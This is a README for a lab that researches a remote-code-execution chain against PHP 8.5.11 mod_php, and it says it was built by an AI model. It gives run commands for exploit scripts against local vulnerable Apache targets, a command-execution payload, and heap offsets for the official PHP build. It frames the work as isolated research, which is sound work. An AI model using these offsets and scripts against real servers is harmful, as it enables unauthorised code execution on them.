# php2shell lab

Built by DeepSeek V4 Flash.

This is a lab-only setup for educational research against PHP 8.5.11 mod_php. The vulnerable module and configuration are intentionally unsafe.

Do not run this against systems you do not own or have explicit authorization to test. Keep the lab isolated and do not expose it to an untrusted network.

## Targets

- `bash lab/start-apache.sh` — urlencoded mode, no-filter build, port 18088.
- `bash lab/start-apache-filter.sh` — filter-enabled build, port 18089.
- `bash lab/start-apache-default.sh` — filter-enabled default-ish limits, port 18090.
- `bash lab/start-apache-session.sh` — session upload-progress target, 8M, port 18091.

Filter-enabled `$_FILES` bypass:

```bash
LAB_ASLR=1 bash lab/start-apache-filter.sh
pid=$(cat lab/httpd-filter.pid)
python3 exploit.py --port 18089 --multipart --auto-ar-data --pid "$pid"
```

Default-limit OOM probe:

```bash
bash lab/start-apache-default.sh
python3 probe_default.py --port 18090 --pressure 1000 --levels 60
```

The filter target uses `memory_limit=28M` in `lab/httpd-filter.conf`; the default target uses `memory_limit=128M` and `post_max_size=8M` in `lab/httpd-default.conf`. Recalibrate if the name length or body size changes.

## Session chain (calibration scaffold)

`session_exploit.py` ports the 9bie/Exploit-DB three-stage session chain (pre-RINIT OOM → `Set-Cookie` leaks → fake reference → `zif_system`).

```bash
bash lab/start-apache-session.sh
python3 session_exploit.py -u http://127.0.0.1:18091/index.php \
    -c 'id>/tmp/p' --proof-file /tmp/p --poison big --huge-mb 12 --rotate
```

Status: the stage skeleton is ported, but the heap geometry is build-specific. The current defaults are the EDB lab profile; the custom minimal PHP 8.5.11 binary in this repo does not reproduce stage 1 with them (it returns a normal 32-byte session cookie). The verified official 8.5.11 profile is:

```text
zif=0x5996e0 dtor=0x7b47a0 htdata=0x690d8
stage1_n=841 forge=63 stage2_t=406 stage2_v=16 pads=31x6 carrier
```

Use that only against a matching official build, or calibrate a profile for this exact `libphp-nts.so`.

The official calibration probe/sweep is ported in `calibrate_session.py`:

```bash
bash lab/start-apache-session.sh
python3 calibrate_session.py -u http://127.0.0.1:18091/index.php \
    --proof-file /tmp/p --out profiles/php-8.5.11-local.json
```

On this minimal build it currently stops at stage 1: the `N=900`/forge-48 probe returns a normal 32-byte cookie with no `vNNNN` stale-block index. A profile for this exact binary is still required; the official 8.5.11 profile values do not transfer to it.
